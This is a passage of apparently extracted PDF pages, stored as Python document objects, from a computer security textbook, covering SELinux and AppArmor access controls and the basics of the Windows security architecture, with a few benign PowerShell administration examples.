(roles, types/domains, contexts, \\netc.) is obviously improved efficiency over having to always specify individual sub-\\njects, permissions, and objects. The downside is still more terminology and layers of \\nabstraction.\\nseCUriTy ConTexTs: Users, roles, and domains Every individual subject and \\nobject controlled by SELinux is governed by a security context, each consisting of a \\nuser, a role, and a domain (also called a type).\\nA user is what you’d expect: an individual user, whether human or daemon. \\nHowever, SELinux maintains its own list of users, separately from the Linux DAC \\nsystem. In security contexts for subjects, the user label indicates which SELinux user \\naccount’s privileges the subject (which, again, must be a process) is running. In secu-\\nrity contexts for objects, the user label indicates which SELinux user account owns \\nthe object.\\nA role is sort of like a group in the Linux DAC system, in that a role may be \\nassumed by any of a number of preauthorized users, each of whom may be authorized \\nto assume different roles at different times. The difference is that in SELinux, a user \\nmay only assume one role at a time, and may only switch roles if and when authorized \\nto do so. The role specified in a security context indicates which role the specified \\nuser is operating within for that particular context.\\nFinally, a domain is sort of like a sandbox: a combination of subjects and objects \\nthat may interact with each other. Domains are also called types, and although \\nM25_STAL0611_04_GE_C25.indd   24 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 826, 'page_label': '25-25'}, page_content='25.7 / MAnDATORy  ACCESS CO n TROLS   25-25\\ndomains and types are two different things in the Flask security model on which the \\nNSA based SELinux, in SELinux, “domain” and “type” are synonymous.\\nThis model, in which each process (subject) is assigned to a domain, wherein \\nonly certain operations are permitted, is called Type Enforcement (TE), and it’s \\nthe heart of SELinux. Type Enforcement also constitutes the bulk of the SELinux \\n implementation in F\\nedora and Red Hat Enterprise Linux.\\nThere’s a bit more to it than that, but before we go into further depth, we \\n pr\\nesent an example scenario to illustrate security contexts.\\nSuppose we’re securing my LED-blinking daemon, blinkled, with SELinux. As \\nyou’ll recall, it’s run with the privileges of the account “someguy,” and it reads the mes-\\nsages it blinks from a text file, which we’ll call /home/someguy/messages.txt.\\nUnder SELinux, we’ll need an SELinux user called “someguy” (remember, this \\nis in addition to the underlying Linux DAC’s “someguy” account, that is, the one in  \\n/etc/passwd). We’ll also need a role for someguy to assume in this context; we \\ncould call it “blink_r” (by convention, SELinux role names end with “_r”).\\nThe heart of blinkled’s security context will be its domain, which we’ll call \\n“blinkled_t” (by convention, SELinux domain names end with “_t” — “t” is short \\nfor “type”). blinkled_t will specify rules that allow the blinkled process to read the \\nfile /home/someguy/messages.txt then write data to, say, /dev/numlockled.\\nThe file /home/someguy/messages.txt and the special file /dev  \\n/numlockled will need security contexts of their own. Both of these contexts can \\nprobably use the blinkled_t domain, but because they describe objects, not subjects, \\nthey’ll specify the catch-all role “object_r.” Objects, which by definition are passive \\nin nature (stuff gets done to them, not the other way around), generally don’t assume \\nmeaningful roles, but every security context must include a role.\\ndeCision-making in selinUx There are two types of decisions SELinux must \\nmake concerning subjects, domains, and objects: access decisions and transition deci-\\nsions. Access decisions involve subjects doing things to objects that already exist, or \\ncreating new things that remain in the expected domain. Access decisions are easy \\nto understand; in our example, “may blinkled read /home/someguy/messages.\\ntxt?” is just such a decision.\\nTransition decisions, however, are a bit more subtle. They involve the invocation \\nof processes in different domains that the one in which the subject process is running; \\nor the creation of objects in different types than their parent directories. (Note: Even \\nthough “domain” and “type” are synonymous in SELinux, by convention we usually \\nuse “domain” when talking about processes, and “type” with files.)\\nThat is, normally, if one process executes another, the second process will by \\ndefault run within the same SELinux domain. If, for example, blinkled spawns a child \\nprocess, the child process will run in the blinkled_t domain, the same as its parent. \\nIf, however, blinkled tries to spawn a process into some other domain, SELinux will \\nneed to make a domain transition decision to determine whether to allow this. Like \\neverything else, transitions must be explicitly authorized in the SELinux policy. This \\nis an important check against privilege-escalation attacks.\\nFile transitions work in a similar way: If a subject creates a file in some direc-\\ntory (and if this file creation is allowed in the subject’s domain), the new file will \\nnormally inherit the security context (user, role, and domain) of the parent directory. \\nM25_STAL0611_04_GE_C25.indd   25 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 827, 'page_label': '25-26'}, page_content='25-26  CHAPTER 25 /  Linux SECuRiTy\\nFor example, if blinkend’s security context allows it to write a new file in /home/\\nsomeguy/, say, /home/someguy/error.log, then error.log will inherit the \\nsecurity context (user, role, and type) of /home/someguy/. If, for some reason, \\nblinkend tries to label error.log with a different security context, SELinux will \\nneed to make a type transition decision.\\nTransition decisions are necessary because the same file or resource may be \\nused in multiple domains/types; process and file transitions are a normal part of sys-\\ntem operation. But if domains can be changed arbitrarily, attackers will have a much \\neasier time doing mischief.\\nrole-based aCCess ConTrol Besides Type Enforcement, SELinux includes a \\nsecond model, called Role-Based Access Control (RBAC). RBAC builds on the con-\\ncepts we’ve already discussed, providing controls especially useful where real human \\nusers, as opposed to daemons and other automated processes, are concerned.\\nRBAC is relatively straightforward. To paraphrase [MCCA05], SELinux rules \\nspecify what roles each user may assume; other rules specify under what circum-\\nstances each user may transition from one authorized role to another (unlike groups \\nin the Linux DAC, in RBAC one user may not assume more than one role at a time); \\nand still other rules specify in which domains each authorized role may operate.\\nmUlTilevel  seCUriTy The third security model implemented in SELinux is \\n Multilev\\nel Security (MLS), which is based on the Bell-LaPadula (BLP) model. \\n Chapter\\xa027 describes the BLP model in detail. In SELinux, MLS is enforced via file \\nsystem labeling.\\nmanaging selinUx poliCies Unfortunately, creating and maintaining SELinux \\npolicies is complicated and time-consuming; a single SELinux policy may consist of \\nhundreds of lines of text. In Red Hat and Fedora, this complexity is mitigated by \\nthe inclusion of a default “targeted” policy that defines types for selected network \\napplications but that allows everything else to run with only Linux DAC controls. \\nYou can use RHEL and Fedora’s system-config-securitylevel GUI to configure the \\ntargeted policy.\\nSELinux policies take the form of various, lengthy text files in /etc/security \\n/selinux. SELinux commands common to all SELinux implementations (besides \\nRHEL and Fedora) are chcon, checkpolicy, getenforce, newrole, run_init, setenforce, \\nand setfiles. Tresys (http://www.tresys.com), however, maintains a suite of free, \\nmainly GUI-based, SELinux tools that are a bit easier to use, including SePCuT, \\nSeUser, Apol, and SeAudit.\\nFor more information on using RHEL’s SELinux implementation, see \\n[COKE05]. See [MCCA05] for more information on creating and maintaining cus-\\ntom SELinux policies.\\nNovell AppArmor\\nAppArmor, Novell’s MAC implementation for SuSE, represents a major step for -\\nward in making MAC technology a feasible option for system administrators who \\nM25_STAL0611_04_GE_C25.indd   26 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 828, 'page_label': '25-27'}, page_content='25.7 / MAnDATORy  ACCESS CO n TROLS   25-27\\nwant strong security controls but don’t have the time or patience to configure and \\nmaintain SELinux. As of this writing, AppArmor is only available for SuSE Linux \\nand SuSE Linux Enterprise. AppArmor, like SELinux, is built on top of the Linux \\nSecurity Modules.\\nAs we’ve seen, SELinux implements three different types of MAC: Type \\nEnforcement, Role-Based Access Controls, and Multilevel Security. In con-\\ntrast, Novell AppArmor has a more modest objective: to restrict the behavior of \\nselected applications in a very granular but targeted way. In focusing on applica-\\ntions (at the expense of roles and data classification), AppArmor is built on the \\nassumption that the single biggest attack vector on most systems is application \\nvulnerabilities. If the application’s behavior is restricted, then the behavior of any \\nattacker who succeeds in exploiting some vulnerability in that application will \\nalso be restricted.\\nFor example, suppose you’re running a Web application that runs as user \\n“nobody” and uses user input to update a local text file. On a typical system, if an \\nattacker compromised that Web application (e.g., by sending unexpected input) the \\nattacker might succeed in gaining a remote shell with the privileges of “nobody.” If \\nthat Web application were protected by AppArmor, however, all the attacker would \\nbe able to do would be to alter that single text file; it would neither be possible for \\nthe attacker to spawn a remote shell (an unexpected action) nor to read or write any \\nother files.\\nComprehensive? By no means: for non-AppArmor-protected applications, the \\nusual (limited) user/group permissions still apply. Normally, only a subset of applica-\\ntions on the system even have AppArmor profiles, and AppArmor provides no con-\\ntrols addressing data classification. To use SELinux terminology, AppArmor provides \\nonly nonglobal Type Enforcement, no Role-Based Access Controls, and no Multilevel \\nSecurity.\\nFor the most part, root is still root, and if you use root access in a sloppy or risky \\nfashion, AppArmor generally won’t protect you from yourself. But if an AppArmor \\nprotected application runs as root and somehow, becomes compromised that applica-\\ntion’s access will be contained, root privileges notwithstanding, because those privi-\\nleges are trumped by the AppArmor policy (which is enforced at the kernel level, \\ncourtesy of Linux Security Modules).\\nAppArmor is, therefore, only a partial implementation of Mandatory Access \\nControls. But on networked systems, application security is arguably the single most \\nimportant area of concern, and that’s what AppArmor zeroes in on. What’s more, \\nAppArmor provides application security via an easy to use graphical user interface \\nthat is fully integrated with SuSE’s system administration tool, YaST.\\nWe are stopping well short of suggesting that AppArmor is interchangeable \\nwith SELinux. If, for example, you run Linux in a true multiuser environment (in \\nwhich users have shell accounts) or use a Linux system to process highly sensitive \\ndata, there really is no substitute for the comprehensive layers of access controls in \\nSELinux.\\nM25_STAL0611_04_GE_C25.indd   27 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 829, 'page_label': '25-28'}, page_content='25-28  CHAPTER 25 /  Linux SECuRiTy\\nBAUE05 Bauer, M. Linux Server Security, Second Edition. Sebastopol, CA: O’Reilly \\nMedia, 2005.\\nCOKE05 Coker, F., and Coker, R. “Taking Advantage of SELinux in Red Hat® Enterprise \\nLinux®.” Red Hat Magazine, April 2005. redhat.com/magazine/006apr05/features/selinux\\nMCCA05 McCarty, B. SELinux: NSA’s Open Source Security Enhanced Linux.  Sebastopol, \\nCA: O’Reilly Media, 2005.\\nSUEH05 Suehring, S., and Ziegler, R. Linux Firewalls. Upper Saddle River, NJ: Novell \\nPress, 2005.\\n 25.8 REFERENCES\\nM25_STAL0611_04_GE_C25.indd   28 10/11/17   3:21 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 830, 'page_label': '26-1'}, page_content='26-1\\n26.1 Fundamental Windows Security Architecture\\nT\\nhe Security Reference Monitor\\nThe Local Security Authority\\nThe Security Account Manager\\nActive Directory\\nWindows Security Basics—An End-to-End Domain Example\\nWindows Security Basics—An End-to-End Workgroup Example\\nPrivileges in Windows\\nAccess Control Lists\\nAccess Checks\\nImpersonation\\nMandatory Access Control\\n26.1\\n Windows Vulnerabilities\\n26.\\n3\\n Windows Security Defenses\\nW\\nindows System Hardening Overview\\nAccount Defenses\\nNetwork Defenses\\nMemory Corruption Defenses\\n26.4\\n Browser Defenses\\n26.\\n5\\n Cryptographic Services\\nEncrypting F\\nile System\\nData Protection API\\nBitLocker\\nTrusted Platform Module\\n26.6\\n Common Criteria\\n26.\\n7\\n References\\n26.\\n8\\n Key Terms and Projects\\nK\\ney Terms\\nProjects\\nWindows Security\\nCHAPTER \\n \\nM26_STAL0611_04_GE_C26.indd   1 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 831, 'page_label': '26-2'}, page_content='26-2  CHAPTER 26 / WindoWS SECuRiTy\\nWindows is the world’s most popular operating system, and as such has a number of \\ninteresting security-related advantages and challenges. The major advantage is any \\nsecurity advancement made to Windows can protect hundreds of millions of non-\\ntechnical users, and advances in security technologies can be used by thousands of \\ncorporations to secure their assets. The challenges for Microsoft are many, including \\nthe fact that security vulnerabilities in Windows can affect millions of users. Of course, \\nthere is nothing unique about Windows having security vulnerabilities; all software \\nproducts have security bugs. However, Windows is used by so many nontechnical \\nusers that Microsoft has some interesting engineering challenges.\\nThis chapter begins with a description of the overall security architecture of \\nWindows 2000 and later (see \\nSection 26.1). It is important to point out that versions \\nof Windows based on the Windows 95 code base, including Windows 98, Windows 98 \\nSE, and Windows Me, had no security model, in contrast to the Windows NT code \\nbase, on which all current versions of Windows are based. The Windows 9x codebase \\nis no longer supported.\\nThe remainder of the chapter covers the security defenses built into Windows, \\nmost notably the security defenses in Windows 2000 and later.\\n 26.1 FUNDAMENT AL WINDOWS SECURITY ARCHITECTURE\\nAnyone who wants to understand Windows security must have knowledge of the \\nbasic fundamental security blocks in the operating system. There are many impor-\\ntant components in Windows that make up the fundamental security infrastructure, \\namong them are the following:\\n• The Security R\\neference Monitor (SRM)\\n• The Local Security \\nAuthority (LSA)\\n• The Security \\nAccount Manager (SAM)\\n• Active Dir\\nectory (AD)\\n• Authentication P\\nackages\\n• WinLogon and NetLogon\\nLet’\\ns look at each in detail.\\nThe Security Reference Monitor\\nThis kernel-mode component performs access checks, generates audit log entries, and \\nmanipulates user rights, also called privileges. Ultimately, every permission check is \\nperformed by the SRM. Most modern operating systems include SRM type functional-\\nity that performs privileged permission checks. SRMs tend to be small in size so their \\ncorrectness can be verified because no one needs a bypassable SRM!\\nThe Local Security Authority\\nThe LSA resides in a user-mode process named lsass.exe and is responsible for \\nenforcing local security policy in Windows. It also issues security tokens to accounts \\nas they log on to the system. Security policy includes:\\n• Passwor\\nd policy, such as complexity rules and expiration times.\\nM26_STAL0611_04_GE_C26.indd   2 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 832, 'page_label': '26-3'}, page_content='26.1 / FundAME n TAL W indoWS SEC u R i T y  ARCH i TECT u RE   26-3\\n• A uditing policy, specifying which operations on what objects to audit.\\n•\\n Privilege set\\ntings, specifying which accounts on a computer can perform privi-\\nleged operations.\\nThe Security Account Manager\\nThe SAM is a database that stores accounts data and relevant security information \\nabout local principals and local groups. Note the term local. Windows has the notion \\nof local and domain accounts. We will explain more about this later, but for now, note \\nthat Windows users can log on to a computer using either accounts that are known \\nonly on that particular computer or accounts that are managed centrally. When a user \\nlogs on to a computer using a local account, the SAM process (SamSrv) takes the \\nlogon information and performs a lookup against the SAM database, which resides \\nin the \\\\Windows\\\\System32\\\\Config directory. If you’re familiar with UNIX, think \\n/etc/passwd (or similar). If the credentials match, then the user can log on to the \\n system,\\n assuming there are no other factors preventing logon, such as logon time \\nrestrictions or privilege issues, which we discuss later in this chapter. Note the SAM \\ndoes not perform the logon; that is the job of the LSA. The SAM file is binary rather \\nthan text, and passwords are stored using the MD4 hash algorithm. On  W\\nindows \\nVista and later, the SAM stores password information using a password-based key \\nderivation function (PBKCS), which is substantially more robust against password \\nguessing attacks than MD4.\\nNote WinLogon handles local logons at the keyboard, and NetLogon handles \\nlogons across the network.\\nActive Directory\\nActive Directory (AD) is Microsoft’s LDAP directory included with Windows \\nServer 2000 and later. All currently supported client versions of Windows, includ-\\ning  W\\nindows 7 , 8 and 10, can communicate with AD to perform security operations \\nincluding account logon. A Windows client will authenticate using AD when the \\nuser logs on to the computer using a domain account rather than a local account. \\nLike the SAM scenario, the user’s credential information is sent securely across the \\nnetwork, verified by AD, and then, if the information is correct, the user can log on \\nat the computer. Note we say “credential” and not “password” because a credential \\nmight take some other form, such as a public and private key pair bound to an X.509 \\ncertificate on a smart card. This is why most corporate laptops include smartcard \\nreaders.\\nLocaL versus Domain accounts W e used the terms local and domain. A net-\\nworked Windows computer can be in one of two configurations: either domain joined \\nor in a workgroup. When a computer is domain joined, users can gain access to that \\ncomputer using domain accounts, which are centrally managed in Active Directory. \\nThey can, if they wish, also log on using local accounts, but local accounts may not \\nhave access to domain resources such as networked printers, Web servers, and e-mail \\nservers. When a computer is in a workgroup, only local accounts can be used, held in \\nthe SAM. There are pros and cons to each scenario. A domain has the major advan-\\ntage of being centrally managed and as such is much more secure. If an environment \\nhas 1000 Windows computers and an employee leaves, the user’s account can be \\nM26_STAL0611_04_GE_C26.indd   3 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 833, 'page_label': '26-4'}, page_content='26-4  CHAPTER 26 / WindoWS  S EC u R i T y\\ndisabled centrally rather than on 1000 individual computers. Security policies, such \\nas which applications are allowed to run, or who can debug applications, are also \\ncentrally managed when using AD. This is not only more secure, it also saves time \\nand effort as the number of ancillary computers rises.\\nThe only advantage of using local accounts is that a computer does not need \\nthe infrastructure required to support a domain using AD.\\nAs mentioned, Windows has the notion of a workgroup, which is simply a \\n collection of computers connected to one another using a network;\\n but rather than \\nusing a central database of accounts in AD, the machines use only local accounts. \\nThe difference between a workgroup and a domain is simply where accounts are \\nauthenticated. A workgroup has no domain controllers; authentication is performed \\non each computer, and a domain authenticates accounts at domain controllers \\n running \\nAD.\\nusing P owersheLL for security aDministration  Windows 7 and Windows \\nServer 2008 and later include a flexible scripting language named \\n P\\nowerShell. Power-\\nShell provides rich access to Windows computers, and that includes access to security \\nsettings. Using PowerShell it is possible to create tailored management tools for your \\norganization. Throughout this chapter, we will give examples of using PowerShell to \\ninvestigate or manipulate security-related details. In some cases, it might be necessary \\nto run an elevated PowerShell instance, one that runs as a privileged account, such as \\na domain or local administrator.\\nIf you are new to PowerShell, there are three core things you need to know. \\nThey are the following:\\n1.\\n P\\nowerShell is based on .NET. If you can do it in C# or VB.NET, you can do it \\nin a PowerShell environment.\\n2.\\n Commands in P\\nowerShell are called cmdlets, and have a consistent verb-noun \\nsyntax.\\n3.\\n Lik\\ne all scripting environments, PowerShell supports piping output from one \\ncommand to another. But unlike other scripting environments, PowerShell \\npipes objects and not text. This allows for very rich data processing, filtering, \\nand analysis. For example, the following pipes Process objects from get-process \\nto format-table:\\nGet-Process | Format-Table\\nOr, you can stop all running Google Chrome (chrome.exe) processes by running:\\nGet-Process–name chrome | Stop-Process\\nThis only works because Process objects, one for each Chrome instance, are sent \\nto a cmdlet that calls the Stop method on a Process object.\\nYou can get a list of object methods and properties by piping to the Get-  \\nMember cmdlet.\\n For example, the following displays all the methods and properties \\nassociated with objects representing Windows:\\nGet-Service | Get-Member.\\nFor more information about PowerShell, refer to https://technet  \\n.microsoft.com/en-us/library/bb978526.aspx.\\nM26_STAL0611_04_GE_C26.indd   4 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 834, 'page_label': '26-5'}, page_content='26.1 / FundAME n TAL W indoWS SEC u R i T y  ARCH i TECT u RE   26-5\\nWindows Security Basics—An End-to-End Domain \\nExample\\nNow that you know the basic elements that make up the core Windows security \\ninfrastructure, we will give an example of what happens when a user logs on to a \\nWindows system.\\nBefore a user can log on to a Windows network, a domain administrator must \\nadd the user’s account information to the system; this will include the user’s name, \\naccount name (which must be unique within the domain), and password. Optionally, \\nthe administrator can grant group membership and privileges.\\nAfter the administrator has entered the user’s account information, Windows \\ncreates an account for the user in the domain controller running AD. Each user \\naccount is uniquely represented by a Security ID (SID). SIDs are unique within a \\ndomain, and every account gets a different SID. This is an important point. If you \\ncreate an account named Blake, delete the account, and “re-create” the account \\nnamed Blake, they are in fact two totally different accounts because they will have \\ndifferent\\xa0SIDs.\\nA user account’s SID is of the following form:\\n•\\n S-1-5-21-AAA-BBB-CCC-RRR\\n.\\n•\\n S simple means SID\\n.\\n•\\n 1 is the SID version number\\n.\\n•\\n 5 is the identifier authority;\\n in this example, 5 is SECURITY_NT_AUTHORITY.\\n•\\n 21 means \\n“not unique,” which just means there is no guarantee of uniqueness; \\nhowever, a SID is unique within a domain, as you will see in a moment.\\n•\\n AAA-BBB-CCC\\n is a unique number representing the domain.\\n•\\n RRR\\n is called a relative ID (RID); it is a number that increase by 1 as each \\nnew account is created. RIDs are never repeated; this is what makes each SID \\nunique.\\nFor example, a SID might look like this:\\nS-1-5-21-123625317-425641126-188346712-2895\\nIn Windows, a username can be in one of two formats. The first, named the \\nSAM format, is supported by all versions of Windows and is of the form DOMAIN\\\\\\nUsername. The second is called User Principal Name (UPN) and looks more like \\nan RFC822 e-mail address: username@domain.company.com. The SAM name \\nshould be considered a legacy format.\\nIf the user enters just a username, then the domain in which the machine resides \\nis pre-pended to the user name. So if Blake’s PC is in the Development domain, and he \\nenters “Blake” as his logon account, he is actually logging on using Development\\\\Blake if \\nSAM accounts are used, or Blake@Development.Company.com if UPN names are used.\\nWhen a user logs on to Windows, he or she does so using either a username and \\npassword, or a username and a smart card. It is possible to use other authentication \\nor identification mechanisms, such as an RSA SecureID token or biometric device, \\nbut these require third-party support.\\nM26_STAL0611_04_GE_C26.indd   5 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 835, 'page_label': '26-6'}, page_content='26-6  CHAPTER 26 / WindoWS SECuRiTy\\nAssuming the user logs on correctly, a Kerberos authentication token is gener-\\nated by the operating system and assigned to the user, as we discuss in \\nChapter\\xa023.1. \\nA token contains the user’s SID, group membership information, and privileges. \\nGroups are also represented using SIDs. We explain privileges subsequently. The \\nuser’s token is assigned to every process run by the user. It is used to perform access \\nchecks discussed subsequently.\\nWindows Security Basics—An End-to-End  \\nWorkgroup Example\\nYou will notice that this section is much smaller than the domain-joined scenario, \\nbecause the process is much simpler.\\nWhen a user logs on to a computer using a local account, the computer must \\nhave a user account and an optional password associated with the account.\\nLet’s say Paige has an account, and the SID for that account is:\\nS-1-5-21-251942251-425652175-1800782563-1238\\nWhen she enters her username and password, a token is created by the  operating\\n \\nsystem, which includes Paige’s SID, SIDs for all the groups of which she is a member, \\nas well as the privileges she holds. Just like in the domain example.\\nOn a domain-joined computer (we will use the “Marketing” domain), it is \\n possible for a \\nuser to log on to a local account by using the “.” domain. So rather \\nthan using “Marketing\\\\Paige” or just “Paige” Paige can use “.\\\\Paige” assuming there \\nis a local Paige account on the computer. The “.” will substitute the machine name \\nas the workgroup name.\\nimPortant note about aDmin accounts anD bLank PassworDs A little earlier \\nwe used the term “optional password” which means Windows can support the use \\nof user accounts that have no password. Hopefully, your first reaction is “isn’t that \\ninsecure?” the answer is “of course, it is,” but some people in a home environment \\nwant to do this. That is why setting a password is actively encouraged during setup, \\nand never applies to domain accounts.\\nYour next reaction might be, “Well, does that mean I can access a computer \\nremotely and log on using a local admin account and not be prompted for a pass-\\nword?” The answer is emphatically, “NO!” Remote access from one Windows com-\\nputer to another using an account that is a member of the local Administrators group \\ncan only be performed if the account has a password. Access is denied when using a \\nnonpassword admin account remotely.\\nUsing PowerShell, you can dump information about the currently logged on \\nuser with this line:\\n[Security.Principal.WindowsIdentity]::GetCurrent()\\nNote this is not using a cmdlet; rather it is calling directly into the .NET \\nFramework.\\nPrivileges in Windows\\nPrivileges are essentially systemwide permissions assigned to user accounts. Exam-\\nples of Windows privileges include the ability to back up the computer, or the \\nability to change the system time. Performing a backup is privileged because it \\nM26_STAL0611_04_GE_C26.indd   6 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 836, 'page_label': '26-7'}, page_content='26.1 / FundAME n TAL W indoWS SEC u R i T y  ARCH i TECT u RE   26-7\\nbypasses all access checks so a complete backup can be performed. Likewise, set-\\nting the \\n system time is privileged because changing the time can mak\\ne Kerberos \\nauthentication fail and lead to erroneous data being written to the logging sys-\\ntem. There are over 45\\xa0privileges in Windows 2000. Some privileges are deemed \\n“dangerous,” which means a malicious account that is granted such a privilege \\ncan cause damage. Examples of such potentially dangerous privileges include the \\nfollowing:\\n•\\n A\\nct as part of operating system privilege. T\\nhis is often referred to as the Trusted \\nComputing Base (TCB) privilege, because it allows code run by an account that \\ngranted this privilege to act as part of the most trusted code in the operating \\nsystem: the security code. This is the most dangerous privilege in Windows, and \\nis granted only the Local System account; even administrators are not granted \\nthis privilege.\\n•\\n Debug \\nprograms privilege.  T\\nhis privilege allows an account to debug any \\nprocess running in Windows. A user account does not need this privilege to \\ndebug an application running under the user’s account. Because of the nature \\nof debuggers, this privilege basically means a user can run any code he or she \\nwants in any running process.\\n•\\n Backup files and dir\\nectories privilege. Any pr\\nocess running with this privilege \\nwill bypass all access control list (ACL) checks, because the process must be \\nable to read all files to build a complete backup. Its sister privilege Restore files \\nand directories is just as dangerous because it will ignore ACL checks when \\ncopying files to source media.\\nSome privileges are generally deemed benign. An example is the “bypass \\n tr\\naverse checking” privilege that is used to traverse directory trees even though the \\nuser may not have permissions on the traversed directory. This privilege is assigned \\nto all user accounts by default and is used as an NTFS file system optimization.\\nAccess Control Lists\\nWindows has two forms of access control list (ACL). The first is called a discre-\\ntionary access control list (DACL) and is usually what most people mean when \\nthey say ACL. A DACL grants or denies access to protected resources in Windows \\nsuch as files, shared memory, and named pipes. The other kind of ACL is the sys-\\ntem access control list (SACL), which is used for auditing to enforce mandatory \\nintegrity policy. Let’s take a moment to look at the DACL.\\nObjects that require protection are assigned a DACL (and if possible a SACL), \\nwhich includes the SID of the object owner (usually the object creator) as well as a \\nlist of access control entries (ACEs). Each ACE includes a SID and an access mask. \\nAn access mask could include the ability to read, write, create, delete, and modify. \\nNote access masks are object-type specific; for example, services (the Windows \\nequivalent of UNIX daemons) are protected objects and support an access mask \\nto create a service (SC_MANAGER_CREATE_SERVICE) and a mask that allows ser-\\nvice enumeration (SC_MANAGER_ENUMERATE_SERVICE). The data structure that \\nincludes the object owner, DACL, and SACL is referred to as the object’s security \\ndescriptor (SD).\\nM26_STAL0611_04_GE_C26.indd   7 10/11/17   3:21 PM'),\n",
